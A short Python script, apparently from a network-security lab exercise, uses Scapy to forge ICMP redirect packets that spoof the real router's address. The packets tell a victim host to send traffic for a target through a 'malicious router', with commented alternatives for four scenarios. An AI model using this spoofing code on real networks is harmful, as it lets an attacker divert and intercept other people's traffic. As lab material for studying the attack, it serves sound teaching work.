from scapy.all import *

victim_ip = "10.9.0.5"
router_ip = "10.9.0.11"

# Scenario 1
malicious_router_ip = "10.9.0.111"

# Scenario 2
# malicious_router_ip = "192.168.60.99"

# Scenario 3
# malicious_router_ip = "10.9.0.250"

# Scenario 4
# malicious_router_ip = "10.9.0.111"
# router_ip = "192.168.60.11"

target_ip = "192.168.60.5"
# Spoof: acting as if coming from real router
ip = IP(src=router_ip, dst=victim_ip)

# ICMP Redirect
icmp = ICMP(type=5, code=1, gw=malicious_router_ip)

# Realistic original packet
original = IP(src=victim_ip, dst=target_ip) / ICMP(type=8)

packet = ip / icmp / original

send(packet, count=30, inter=0.3)